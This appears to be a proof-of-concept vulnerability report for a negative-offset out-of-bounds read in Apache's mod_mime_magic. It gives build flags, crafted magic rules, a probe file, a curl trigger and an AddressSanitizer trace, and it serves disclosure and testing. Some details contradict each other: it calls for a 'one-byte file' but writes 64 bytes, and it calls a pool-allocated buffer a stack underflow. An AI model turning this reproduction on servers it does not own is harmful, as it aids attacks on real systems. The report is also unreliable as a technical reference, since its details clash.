# 010 — `mod_mime_magic` negative offset OOB read

`mget()` accepts signed offsets parsed from the magic file but only validates
the upper bound (`offset + sizeof(union VALUETYPE) > nbytes`). A negative
offset passes that check and `memcpy(p, s + offset, sizeof(union VALUETYPE))`
reads from before the input buffer.

## Setup

```apache
LoadModule mime_magic_module modules/mod_mime_magic.so

MimeMagicFile conf/magic
```

Build with ASan to capture the underflow:

```bash
CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g" \
    ./configure --enable-mime-magic
make && make install
```

Add a single negative-offset rule (direct form) at the bottom of
`conf/magic`:

```text
-1	byte	x	application/x-poc
```

For the indirect form add instead:

```text
0	byte	x	application/x-poc
>(0.b-1)	byte	x	underflow
```

Drop a one-byte file the magic engine will examine — it must be at least
`sizeof(union VALUETYPE)` bytes for the upper-bound check to pass:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*64)" \
    > /var/www/html/probe.bin
chmod 644 /var/www/html/probe.bin
```

## Trigger

```bash
curl -sS -o /dev/null http://127.0.0.1/probe.bin
```

`mod_mime_magic` runs `magic_find_ct() -> magic_process() -> tryit() ->
softmagic() -> match() -> mget()` during type checking and reaches the
unguarded `memcpy()`.

## Observed effect

ASan stack-buffer-underflow report in `error_log`:

```text
==12345==ERROR: AddressSanitizer: stack-buffer-underflow
READ of size 16 at 0x7ffd... thread T0
    #0 memcpy
    #1 mget        modules/metadata/mod_mime_magic.c:1817
    #2 match       modules/metadata/mod_mime_magic.c:...
    #3 softmagic   modules/metadata/mod_mime_magic.c:...
    #4 magic_process
    #5 magic_find_ct
```

The faulting address sits one byte before the `apr_palloc`-backed read
buffer that `tryit()` passed to `mget()`. On non-sanitized builds the read
silently returns whatever bytes precede the buffer, which may influence
`p->b` and the rule match decision.
